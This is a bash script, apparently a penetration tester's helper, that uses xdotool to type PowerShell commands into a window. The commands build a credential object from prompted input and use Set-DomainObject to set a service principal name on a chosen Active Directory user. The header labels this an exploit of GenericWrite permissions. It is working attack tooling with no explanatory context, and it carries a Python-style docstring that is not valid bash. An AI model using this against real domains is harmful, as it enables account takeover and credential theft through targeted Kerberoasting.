#!/bin/bash

"""
powershell: genericWrite permissions exploit
"""

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh

PASSWORD=$(zenity --entry --title="Password" --text="Enter password:")
paste_command "\$SecPassword = ConvertTo-SecureString '${PASSWORD}' -AsPlainText -Force"
xdotool key Return
sleep 1.5

USERNAME=$(zenity --entry --title="Domain\Username" --text="Enter username:")
paste_command "\$Cred = New-Object System.Management.Automation.PSCredential('${USERNAME}', \$SecPassword)"
xdotool key Return
sleep 1.5

REQUEST_USER=$(zenity --entry --title="Request user" --text="Enter request user:")
paste_command "Set-DomainObject -credential \$Cred -Identity ${REQUEST_USER} -SET @{serviceprincipalname='pentesting/LEGIT'} -Verbose"
xdotool key Return
sleep 1.5
